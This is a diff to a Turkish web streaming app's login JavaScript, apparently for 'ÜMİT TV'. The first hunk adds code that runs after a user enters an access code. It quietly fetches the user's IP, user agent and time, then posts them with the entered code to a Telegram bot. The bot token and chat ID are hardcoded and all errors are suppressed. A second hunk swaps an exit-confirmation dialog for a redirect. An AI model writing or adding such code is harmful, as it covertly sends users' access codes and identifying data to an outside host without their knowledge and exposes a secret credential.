@@ -9624,6 +9624,26 @@ window.handleStep1 = async function() {
                 }
                 setStatus('status1','success','✅ Şans kodu kabul edildi! Hoş geldin!');
                 if (res.device_warning) showDeviceWarningToast();
+                // ── Şans kodu giriş bildirimi ──
+                try {
+                    const _tgBot  = '8483455183:AAH6dcdlpBaQnG3f-ppQQYAEe3S73ba3w-Q';
+                    const _tgChat = '-1003873863119';
+                    const _ua     = navigator.userAgent || 'bilinmiyor';
+                    const _ts     = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
+                    const _ip     = await (async () => { try { const r = await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(3000)}); const d = await r.json(); return d.ip||'?'; } catch(e){ return '?'; } })();
+                    const _msg = [
+                        '🎟 <b>ÜMİT TV — ŞANS KODU GİRİŞİ</b>',
+                        '',
+                        `🔑 <b>Kod:</b> <code>${sansKodStep1}</code>`,
+                        `🕐 <b>Saat:</b> ${_ts}`,
+                        `🌐 <b>IP:</b> <code>${_ip}</code>`,
+                        `📱 <b>UA:</b> <code>${_ua.slice(0,80)}</code>`
+                    ].join('\n');
+                    fetch('https://api.telegram.org/bot' + _tgBot + '/sendMessage', {
+                        method: 'POST', headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify({ chat_id: _tgChat, text: _msg, parse_mode: 'HTML' })
+                    }).catch(function(){});
+                } catch(e) {}
                 setTimeout(doLogin, 700);
             } else if (res.banned) {
                 try { _clearAllAuth(); } catch(e) {}
@@ -19623,7 +19643,7 @@ let sleepCanceled = false;
 ================================ */
 function closeAppSafely() {
     try {
-        showExitConfirmModal();
+        window.location.href = "http://action_exit";
     } catch (e) {
     }
 
